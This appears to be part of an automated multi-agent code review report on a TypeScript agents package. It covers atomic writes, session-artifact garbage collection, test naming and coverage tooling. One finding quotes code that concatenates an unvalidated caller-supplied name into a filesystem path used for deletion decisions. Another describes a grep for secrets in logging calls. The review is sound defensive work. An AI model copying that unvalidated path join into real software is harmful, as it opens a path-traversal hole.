### F-dom-12: The cwd sidecar is written with a non-atomic `writeFileSync` while its sibling in the same slice — the session pointer, same directory, same shared-across-processes exposure — uses `atomicWriteText` precisely so a concurrent reader cannot observe a partial value. A torn read of the sidecar returns a TRUNCATED path, and `resolveProjectDir`'s documented contract only covers `undefined` ("not known here"), not "a shorter path than the one that was written".


- **Found by:** review-crossval-4-6-absorption-domain-concurrency
- **File:** `packages/agents/src/session/project-index.ts` line 83
- **Plan reference:** T3.2 / T2.4 — the reverse index and its secure creation
- **Domain anchor:** session-pointer.ts:69-73 — "Delegates to `atomicWriteText`, so a reader never observes a half-written pointer"
- **Evidence:**

  ```ts
  // project-index.ts:82-83
  ensureSecureDir(sidecar)
  writeFileSync(sidecar, `${cwd}\n`, 'utf8')      // truncate-then-write
  ```
  versus
  ```ts
  // session-pointer.ts:103
  await (atomicWriteText as ...)(target, `${sessionId}\n`)
  ```
  `atomicWriteText` is already imported by this package and is a published `/persistence`
  pass-through, so the fix has no new dependency.

- **Recommended action:** Use `atomicWriteText` for the sidecar as well (it is the same one-line delegation the pointer already makes), or state in `resolveProjectDir`'s docblock that a non-empty return may be torn and must be validated with `projectDirMatches` before use.


### F-dom-13: The collector removes exactly one of the four artifact kinds the SDK defines. `rmSync` targets `transcriptPath(...)` only, so a `<id>.jsonl.writer.lock`, a `<id>.jsonl.lock` directory, or an atomic-write `temp` left by a process that died mid-write survives every sweep forever — and `listSessions` filters to `kind === 'transcript'`, so nothing ever sees them again.


- **Found by:** review-crossval-4-6-absorption-domain-concurrency
- **File:** `packages/agents/src/session/gc/transcript-gc.ts` line 305
- **Plan reference:** M72 — "the framework ships everything that CREATES unbounded disk state and nothing that bounded it"
- **Domain anchor:** "@theokit/sdk classifySessionArtifact — four artifact kinds: transcript, writer-lock, lock-directory, temp (node_modules/@theokit/sdk/dist/persistence.js:14-21)"
- **Evidence:**

  ```ts
  // transcript-gc.ts:305
  rmSync(transcriptPath(plan.root, plan.cwd, candidate.id))
  ```
  ```ts
  // session-lifecycle.ts:124
  if (kind !== 'transcript') continue      // writer-lock / lock-directory / temp are dropped
  ```
  SDK classification (node_modules/@theokit/sdk/dist/persistence.js:14-21) enumerates all four
  kinds, so the framework has the vocabulary to collect them and chooses not to.

- **Recommended action:** When a transcript is successfully unlinked, remove its sibling artifacts for the same id (`<id>.jsonl.writer.lock`, `<id>.jsonl.lock`, temp targets resolving to `<id>.jsonl`) with `force: true`, and only for the id just collected. Do NOT sweep orphan artifacts generally — an orphan lock whose owner is alive is protection, not residue.


### F-dom-9: `name` — a caller-supplied string — is interpolated into a filesystem path with string concatenation and no validation, in a module whose verdict the same caller uses to choose a deletion target keyed by that same name.

- **Found by:** review-crossval-4-6-absorption-domain-security
- **File:** `packages/agents/src/session/liveness-oracle.ts` line 156
- **Plan reference:** T3.2 — the liveness question absorbed into the package
- **Domain anchor:** rules/error-handling.md 2 (validate inputs at the system boundary); rules/architecture.md 3 (the module owns the encoding, so it owns what a valid name is)
- **Evidence:**

  ```ts
  // liveness-oracle.ts:156
  const dir = `${opts.projectsRoot}/${name}`
  ```
  Reachable today only with well-formed names (the known consumer feeds readdir entries, which
  cannot contain a separator), so this is a hardening gap rather than a live defect. But the
  module OWNS encodeProjectDir (:98-100) and therefore knows exactly what a valid encoded name
  looks like (/^[A-Za-z0-9-]+$/), and the reads it performs (listEntries, firstLine) are the
  evidence a destructive decision rests on. join() would also be the house style — every sibling
  in packages/agents/src/session uses node:path.

- **Recommended action:** Use join(opts.projectsRoot, name) and reject a name outside the encoding's own character class with an undetermined verdict naming the reason. Cheap, and it makes the module's input contract enforced rather than assumed.

### F-orch-5: Pre-existing G6 breach on the branch — 527 code lines against a 500 budget.

- **Found by:** orchestrator
- **File:** `tests/unit/instruction-tree.test.ts` line 1
- **Plan reference:** rules/system-design-guardrails.md § G6
- **Evidence:**

  Introduced by b8f47a9b / 78256052, not by this plan; no commit from this session
  touches the file. `knip` additionally exits 1 on two pre-existing findings:
  unused exported type `SecureStoreRead` (hooks/secure-store.ts:35) and duplicate
  export DelegationBudgetExceededError|BudgetExceededError (bridge/delegation-types.ts,
  from 5f1832a9).

- **Recommended action:** Out of this plan's scope; recorded so the branch's state is not reported as clean. Removing an unused exported TYPE is itself a breaking change to the published surface.


### F-tests-10: Two test names join two behaviours with "and", and each body asserts all of them.

- **Found by:** review-crossval-4-6-absorption-tests
- **File:** `packages/agents/tests/unit/liveness-oracle-recorded-cwd.test.ts` line 172
- **Plan reference:** rules/testing.md § 3 ("each test exercises ONE behaviour; 'and' in the test name is a smell")
- **Evidence:**

  packages/agents/tests/unit/liveness-oracle-recorded-cwd.test.ts:172
    test_budget_exhaustion_yields_undetermined_and_never_exceeds_the_bound
    — asserts three things: fs.ops() <= 5, no verdict is 'dead', out.size === 20.
  packages/agents/tests/unit/liveness-oracle.test.ts:251
    test_enumeration_failure_yields_undetermined_for_every_project_with_a_typed_error
    — and there is no typed error: the assertion is `reason` matching /enumerat/i on a
    plain verdict object. The name promises the rules/testing.md § 4.1 standard ("assert
    the specific typed error") that the body does not meet. Not a defect in the module
    (it returns verdicts, it does not throw) — a defect in the name.

- **Recommended action:** Split the first; rename the second to describe the reason string it actually asserts.

### F-tests-11: The fix left three stale references behind: the file header still points readers at a test name that no longer exists, and the CI predicate changed semantics in passing.


- **Found by:** review-crossval-4-6-absorption-tests
- **File:** `tests/integration/crossval-gaps.test.ts` line 28
- **Plan reference:** F-tests-1 fix (081833db)
- **Evidence:**

  tests/integration/crossval-gaps.test.ts:28-29 (docblock, untouched by 081833db)
    "... a vacuous pass on the plan's single metric. `ci_refuses_a_mostly_skipped_run`
     below turns that into a failure under CI."
  That `it` no longer exists — the rule is now an afterAll at :223 calling
  refuseMostlySkipped. A reader searching for the named test finds nothing.
  
  Predicate change, tests/integration/crossval-gaps.test.ts:224:
    before: if (!process.env.CI) return          -> CI="" or CI="0" disables the guard
    after:  refuseMostlySkipped(skipped, process.env.CI !== undefined)
                                                 -> CI="" or CI="0" now ENFORCES it
  Stricter, therefore harmless in CI, but it is an undocumented behaviour change in a file
  whose whole subject is when the guard fires.
  
  Same class, in the module under test: packages/agents/src/session/liveness-oracle.ts:14
  still documents the option as `listProjects` after 7fea1388 renamed it to `candidatePaths`
  (the rename is documented at :62-73, so the file contradicts itself).

- **Recommended action:** Update the three docblocks; if the CI predicate change was intentional, say so in the comment.


## INFO findings (7)

### F-arch-18: Credit where due — the two substantive corrections in 7fea1388 are right, well-evidenced and well-documented, and the removal note is the correct way to retire a defective helper.

- **Found by:** review-crossval-4-6-absorption-architecture
- **File:** `packages/agents/src/session/liveness-oracle.ts` line 102
- **Plan reference:** previous review F-arch-1; rules/error-handling.md
- **Evidence:**

  (a) `likelyPath` is genuinely uninvertible and its removal is proven in place rather than
  deleted silently:
  ```ts
  // liveness-oracle.ts:102-115
  * REMOVED 2026-08-16 — `likelyPath` ... encode('/home/op/Projetos/theo/theokit-framework')
  *   → '-home-op-...-theokit-framework';  likelyPath(that) → '.../theokit/framework' ← not the input
  ```
  (b) The fall-through moved from `dead` to `undetermined` with the asymmetry argued explicitly
  (:227-241), which is the correct application of `rules/error-handling.md` on a delete path, and
  the two tests that changed verdict carry their refutation in the test body
  (liveness-oracle.test.ts:210-219). The `.changeset/liveness-oracle-recorded-cwd-major.md`
  (`"@theokit/agents": major`) plus the `### Changed` / `BREAKING:` CHANGELOG entry follow the
  discipline that closed the previous review's F-xval-2 — verified, that finding is CLOSED.


### F-arch-19: No issues found — the breaking-change machinery is correct, and the previous review's release-derivation BLOCKER is closed.

- **Found by:** review-crossval-4-6-absorption-architecture
- **File:** `.changeset/liveness-oracle-recorded-cwd-major.md` line 1
- **Plan reference:** previous review F-xval-2 / F-dom-1 (re-check); rules/cycle-release.md § Bump-level derivation
- **Evidence:**

  `.changeset/` holds `liveness-oracle-recorded-cwd-major.md` (`major`) and
  `session-lifecycle-async-major.md`; `CHANGELOG.md` `[Unreleased] ### Changed` carries three
  entries each literally beginning `BREAKING:`, which is what `cycle-release.md` § Bump-level
  derivation reads for a major. The CHANGELOG even states the derivation rule inline and why the
  entries were moved out of `### Fixed`.


### F-arch-20: No issues found — the budget-sizing finding is filed correctly, with the measurement, the derived rule (`budget >= 3N`) and three options recorded without prescribing one, citing G11 for why.

- **Found by:** review-crossval-4-6-absorption-architecture
- **File:** `.claude/knowledge-base/backlog.md` line 1156
- **Plan reference:** c5465d16
- **Evidence:**

  `## Orçamento subdimensionado do classifyProjects degrada em silêncio (2026-08-16)` at :1156,
  sourced from the pillar-(c) run. This is the right home for it; see F-arch-10 for the
  code-side consequence that remains open.


### F-arch-21: No issues found — audit-trail-only commit; the root-cause attribution to the PLAN's pseudo-code (crossval-4-6-absorption-plan.md:1391-1408 specified only the fallback) is accurate and is the correct place to record it.

- **Found by:** review-crossval-4-6-absorption-architecture
- **File:** `.claude/knowledge-base/reviews/crossval-4-6-absorption-T3.2-blocker-2026-08-16.md` line 1
- **Plan reference:** f838333d
- **Evidence:**

  Verified against the plan: the T3.2 pseudo-code block at :1391-1408 contains
  `if directExists(decodeIfPossible(enc)): mark alive` and no recorded-cwd read — the
  implementation built what the plan specified. Per `cycle-implement.md` anti-patterns the fix
  belongs in a plan amendment; the blocker report says so and no plan edit was made, which is
  consistent with the plan being frozen post-review.


### F-dom-3: VERIFIED CLOSED by commit 90e9af57. The previous review's F-dom-3 (the hang-fix was opt-in and nothing opted in) no longer holds: the bound is now a parameter default, so BOTH call sites get it without changing, and unbounded has to be asked for explicitly.


- **Found by:** review-crossval-4-6-absorption-domain-concurrency
- **File:** `packages/agents/src/session/gc/registry-remover.ts` line 55
- **Plan reference:** T2.2 Concurrency tests — "remover_that_never_settles_times_out_with_a_typed_error"
- **Domain anchor:** registry-remover.ts:42-54 — "The bound was OPT-IN in the first version of this fix, and nothing opted in"
- **Evidence:**

  ```ts
  // registry-remover.ts:55
  export const DEFAULT_REGISTRY_TIMEOUT_MS = 30_000
  // registry-remover.ts:76-81
  export async function awaitRegistryRemoval(
    outcome: unknown, sessionId: string,
    timeoutMs: number | undefined = DEFAULT_REGISTRY_TIMEOUT_MS,
  ): Promise<unknown> {
    if (!isThenable(outcome) || !Number.isFinite(timeoutMs)) return outcome
  ```
  Both call sites pass a possibly-`undefined` option, which is exactly what triggers the default:
  transcript-gc.ts:294 and session-lifecycle.ts:258.
  
  Proven, not assumed: `gc-registry-remover.test.ts:280`
  ("test_the_default_is_finite_and_is_what_an_absent_option_resolves_to") omits the argument and
  drives fake timers to `DEFAULT_REGISTRY_TIMEOUT_MS ± 1`, asserting it does not fire early and
  does fire on time — i.e. the SHIPPED number is verified, not a smaller test-friendly one.
  `tests/integration/gc-sweep-bounded.test.ts:134` pins the `Infinity` escape hatch.
  
  The behaviour change is declared where a consumer will meet it:
  `.changeset/session-lifecycle-async-major.md` ("the registry timeout now has a bounded DEFAULT
  (`DEFAULT_REGISTRY_TIMEOUT_MS`, 30s) where it previously waited forever") and CHANGELOG.md:93-101.

- **Recommended action:** No action. Recorded so a later change does not silently revert the default to opt-in.

### F-dom-10: No issues found on secret handling in the diff itself. No secret value is committed, logged or surfaced in a diagnostic by any code this branch adds.

- **Found by:** review-crossval-4-6-absorption-domain-security
- **File:** `packages/agents/src` line 1
- **Plan reference:** whole-branch sweep
- **Domain anchor:** Review rule: never include a secret value in a finding; project issue policy (no secrets in bodies)
- **Evidence:**

  git diff main...HEAD -- packages/ piped through a grep for added lines that combine a logging
  call (console.log/error/warn, diag) with token / secret / apiKey / api_key / password /
  refreshToken -> 0 results.
  The one diagnostic on the newly published credential path (token-storage.ts:39) names the file
  path and the keytar remedy only, never the bundle.


### F-orch-3: The automated edge-case coverage number is unusable for this plan and is reported as such rather than quoted. Measured false-negative rate in a 4-item spot check: 3 of 4.


- **Found by:** orchestrator
- **File:** `.claude/skills/review/scripts/edge_case_coverage.py` line 1
- **Plan reference:** cycle-review.md Step 6
- **Evidence:**

  Script output: 99 "edge cases" found, 8 covered, ratio 0.081 (--tests-dir tests/);
  7 covered with --tests-dir packages/agents/tests. Two independent reasons it is wrong:
  
  1. It walks ONE directory. This plan's unit tests live in packages/agents/tests/,
     theokit-tui/src/ and theokit-sdk/packages/sdk/tests/ — three trees it never sees.
  2. The denominator is inflated: 54 of the 99 items come from
     "acceptance-criteria-or-other-bullet", including DoD lines that are not edge cases
     at all (e.g. "BACKLOG.md upstream register at zero open rows").
  
  Spot check of 4 items reported `missing`:
    "unknown tool under auto-edit -> false"      -> COVERED (approval-decision.test.ts:77)
    "remover rejects -> transcript still present"-> COVERED (gc-registry-remover.test.ts:79)
    "dist unbuilt -> skip with a reason"         -> COVERED (crossval-gaps.test.ts:296,359)
    "transitive closure of the published entry"  -> genuinely MISSING (see F-orch-2)

- **Recommended action:** Treat the tests-reviewer agent's judgement as the edge-case signal for this review. Separately, the script deserves a multi-directory option and a filter that excludes DoD bullets from the edge-case denominator.



## Handoff decision

Implementation has BLOCKER and/or > 2 HIGH findings. Loop back to `/implement` to address.

## Audit trail

Spawned agents (their findings files live alongside this report):

- `.claude/agents/review-crossval-4-6-absorption-2026-08-16/review-crossval-4-6-absorption-architecture.md`
- `.claude/agents/review-crossval-4-6-absorption-2026-08-16/review-crossval-4-6-absorption-cross-validation.md`
- `.claude/agents/review-crossval-4-6-absorption-2026-08-16/review-crossval-4-6-absorption-domain-api-design.md`
- `.claude/agents/review-crossval-4-6-absorption-2026-08-16/review-crossval-4-6-absorption-domain-concurrency.md`
- `.claude/agents/review-crossval-4-6-absorption-2026-08-16/review-crossval-4-6-absorption-domain-security.md`
- `.claude/agents/review-crossval-4-6-absorption-2026-08-16/orchestrator.md`
- `.claude/agents/review-crossval-4-6-absorption-2026-08-16/review-crossval-4-6-absorption-tests.md`
- `.claude/agents/review-crossval-4-6-absorption-2026-08-16/review-crossval-4-6-absorption-wiring.md`
